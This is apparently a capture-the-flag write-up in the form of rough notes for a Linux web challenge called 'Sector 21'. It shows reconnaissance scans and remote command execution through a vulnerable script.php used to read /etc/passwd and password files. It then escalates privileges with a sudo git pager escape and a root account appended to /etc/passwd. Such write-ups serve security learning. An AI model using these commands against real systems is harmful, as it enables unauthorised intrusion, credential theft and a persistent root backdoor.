---
title: "Sector 21"
date: 2025-02-11
slug: sector-21
tags: [linux, web, privesc]
difficulty: Medium
---
**Flag format: `sector21{<flag>}`**


email - 
sector21.nob0dy@gmail.com


using website https://epieos.com/ we got information about public google calendar which had the website address - https://epieos.com/?q=sector21.nob0dy%40gmail.com&t=email

![[Pasted image 20250208172924.png]]


task website 
http://darkrift.sector21.org/
ip - http://20.193.135.95/

using nmap 

```
❯ nmap -sCV 20.193.135.95


PORT     STATE SERVICE     VERSION

80/tcp   open  http        nginx 1.14.0 (Ubuntu)


```

```
❯ gobuster dir -u http://20.193.135.95 -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js,txt

/index.html           (Status: 200) [Size: 2207]
/assets               (Status: 301) [Size: 194] [--> http://20.193.135.95/assets/]
/forms                (Status: 301) [Size: 194] [--> http://20.193.135.95/forms/]
/backup               (Status: 200) [Size: 555]
/script.php           (Status: 200) [Size: 0]
/backups              (Status: 301) [Size: 194] [--> http://20.193.135.95/backups/]


```

V20xNGFGcDZSWFJqTWxacVpFYzVlVTFxUmpkVFIwWm1VMGRHWm1SV09VZE5TRlpQV2tZNWRGSldPVlZoUjFaVFdsWTVUbUl4U214WU1WRjNXREpqZDJaUg



found a dashboard on 
http://darkrift.sector21.org:3001/dashboard
we can use hydra to bruteforce 

uname to try darkrift
uname tried ADMIN 


```
<!-- Default credentials for development. Remove it when ransomeware is launched -->
 <!-- user: cyberguy, pass: Sup3rS3cur3P@ss -->
```

one more email found - 
darkrift@protonmail.ch

using -- 
https://www.exploit-db.com/exploits/47553

https://github.com/neex/phuip-fpizdam



```
❯ curl "http://20.193.135.95/script.php?a=sh%20-c%20'cd%20forms%3B%20ls%3B%20cat%20newsletter.php'"

contact.php
newsletter.php
```


```
<?php
  /**
  * Requires the "PHP Email Form" library
  * The "PHP Email Form" library is available only in the pro version of the template
  * The library should be uploaded to: vendor/php-email-form/php-email-form.php
  * For more info and help: https://bootstrapmade.com/php-email-form/
  */

  // Replace contact@example.com with your real receiving email address
  $receiving_email_address = 'contact@example.com';

  if( file_exists($php_email_form = '../assets/vendor/php-email-form/php-email-form.php' )) {
    include( $php_email_form );
  } else {
    die( 'Unable to load the "PHP Email Form" Library!');
  }

  $contact = new PHP_Email_Form;
  $contact->ajax = true;
  
  $contact->to = $receiving_email_address;
  $contact->from_name = $_POST['email'];
  $contact->from_email = $_POST['email'];
  $contact->subject ="New Subscription: " . $_POST['email'];

  // Uncomment below code if you want to use SMTP to send emails. You need to enter your correct SMTP credentials
  /*
  $contact->smtp = array(
    'host' => 'example.com',
    'username' => 'example',
    'password' => 'pass',
    'port' => '587'
  );
  */

  $contact->add_message( $_POST['email'], 'Email');

  echo $contact->send();
?>
❯ curl "http://20.193.135.95/script.php?a=sh%20-c%20'cd%20forms%3B%20cat%20contact.php'"

❯ curl "http://20.193.135.95/script.php?a=sh%20-c%20'cd%20forms%3B%20cat%20contact.php'"

❯ curl "http://20.193.135.95/script.php?a=sh%20-c%20'cd%20forms%3B%20cat%20contact.php'"

<?php
  /**
  * Requires the "PHP Email Form" library
  * The "PHP Email Form" library is available only in the pro version of the template
  * The library should be uploaded to: vendor/php-email-form/php-email-form.php
  * For more info and help: https://bootstrapmade.com/php-email-form/
  */

  // Replace contact@example.com with your real receiving email address
  $receiving_email_address = 'contact@example.com';

  if( file_exists($php_email_form = '../assets/vendor/php-email-form/php-email-form.php' )) {
    include( $php_email_form );
  } else {
    die( 'Unable to load the "PHP Email Form" Library!');
  }

  $contact = new PHP_Email_Form;
  $contact->ajax = true;
  
  $contact->to = $receiving_email_address;
  $contact->from_name = $_POST['name'];
  $contact->from_email = $_POST['email'];
  $contact->subject = $_POST['subject'];

  // Uncomment below code if you want to use SMTP to send emails. You need to enter your correct SMTP credentials
  /*
  $contact->smtp = array(
    'host' => 'example.com',
    'username' => 'example',
    'password' => 'pass',
    'port' => '587'
  );
  */

  $contact->add_message( $_POST['name'], 'From');
  $contact->add_message( $_POST['email'], 'Email');
  $contact->add_message( $_POST['message'], 'Message', 10);

  echo $contact->send();
?>
```


```
❯ curl "http://20.193.135.95/script.php?a=ls"

assets
backup
backups
forms
index.html
index.nginx-debian.html
script.php
```

```
❯ curl "http://20.193.135.95/script.php?a=cat%20/opt/backup.pass"

bm90cGFzc3dvcmR0cnlhZ2Fpbg=
cGFzc3dvcmQ=
aGVyZWlzdGhlcGFzc3dvcmQ=
cGFzc3dvcmRmb3J5b3Vpc3RoZXBhc3N3b3Jk
cGFzc3dvcmRmb3J5b3U=
cGFzc3dvcmRpc25vdHRoZXBhc3N3b3Jk%        


- `bm90cGFzc3dvcmR0cnlhZ2Fpbg=` → `notpasswordtryagain`
- `cGFzc3dvcmQ=` → `password`
- `aGVyZWlzdGhlcGFzc3dvcmQ=` → `hereisthepassword`
- `cGFzc3dvcmRmb3J5b3Vpc3RoZXBhc3N3b3Jk` → `passwordforyouisthepassword`
- `cGFzc3dvcmRmb3J5b3U=` → `passwordforyou`
- `cGFzc3dvcmRpc25vdHRoZXBhc3N3b3Jk` → `passwordisnotthepassword`



```

```
❯ curl "http://20.193.135.95/script.php?a=cat%20/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
angry:x:1000:1000::/home/angry:/bin/sh
groot:x:1001:1001::/home/groot:/bin/sh
```

```


for privilege escalation we cant use sudo 
we have no curl or wget




```


**passwordforyou** was the password for groot 

flag 2 -- 
sector21{WaS_easY_buT_Bit_tRiCky_rIghT_dig_In}


```
sudo -l
Matching Defaults entries for groot on darkrift:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User groot may run the following commands on darkrift:
    (angry) NOPASSWD: /usr/bin/git
```


```
$ sudo -u angry git -p help config
!/bin/sh
sudo -u angry git -p help config
WARNING: terminal is not fully functional
!/bin/shs RETURN)
$ whoami
whoami
angry
$ cat /home/angry/flag3.txt
cat /home/angry/flag3.txt
sector21{WaS_easY_buT_Bit_tRiCky_rIghT_dig_In}
```


flag 3 -- 
sector21{WaS_easY_buT_Bit_tRiCky_rIghT_dig_In}


```
openssl passwd -6 raj

$6$De259AWrPEa1KEKB$GftvZlmDxWK4y3sJdfNxoyLrbwXZsP.dAyWk5vR1CFxMRW54Hwhan1LoyYW.xDZeu0ACitevaP6qRS8P1df2V/
```



```
$ echo 'attack:$6$De259AWrPEa1KEKB$GftvZlmDxWK4y3sJdfNxoyLrbwXZsP.dAyWk5vR1CFxMRW54Hwhan1LoyYW.xDZeu0ACitevaP6qRS8P1df2V/:0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'attack:$6$De259AWrPEa1KEKB$GftvZlmDxWK4y3sJdfNxoyLrbwXZsP.dAyWk5vR1CFxMRW54Hwhan1LoyYW.xDZeu0ACitevaP6qRS8P1df2V/:0:0:root:/root:/bin/bash' >> /etc/passwd
$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
angry:x:1000:1000::/home/angry:/bin/sh
groot:x:1001:1001::/home/groot:/bin/sh
attack:$6$De259AWrPEa1KEKB$GftvZlmDxWK4y3sJdfNxoyLrbwXZsP.dAyWk5vR1CFxMRW54Hwhan1LoyYW.xDZeu0ACitevaP6qRS8P1df2V/:0:0:root:/root:/bin/bash
$ su attack
su attack
Password: raj

root@darkrift:/tmp# cd /root
cd /root
root@darkrift:~# ls
ls
final-flag.txt  reset.sh
root@darkrift:~# cat final-flag.txt
cat final-flag.txt
Don't trust anyone. This is not gonna end here......... -A####

sector21{OnCe_A_BlacK_thE_DarK_wiLL_alWayS_Be_thErE}root@darkrift:~# ls
ls

```


root flag - sector21{OnCe_A_BlacK_thE_DarK_wiLL_alWayS_Be_thErE}
